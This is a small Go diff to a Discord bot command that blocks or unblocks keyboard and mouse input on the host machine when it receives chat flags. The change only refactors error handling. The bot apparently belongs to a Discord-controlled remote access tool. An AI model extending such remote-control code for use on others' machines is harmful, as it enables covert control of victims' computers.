@@ -11,20 +11,20 @@ import (
 )
 
 func (*InputCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
-	blocked := false
+	content := strings.Join(args, " ")
+
 	var err error
 
-	content := strings.Join(args, " ")
 	if utils.HasFlag(content, "block") {
-		blocked, err = funcs.DisableInputs(true)
+		err = funcs.DisableInputs(true)
 	} else if utils.HasFlag(content, "unblock") {
-		blocked, err = funcs.DisableInputs(false)
+		err = funcs.DisableInputs(false)
 	} else {
 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
 		return
 	}
 
-	if blocked {
+	if err == nil {
 		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set input.", msg.Reference())
 	} else {
 		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to set input - %s", err), msg.Reference())
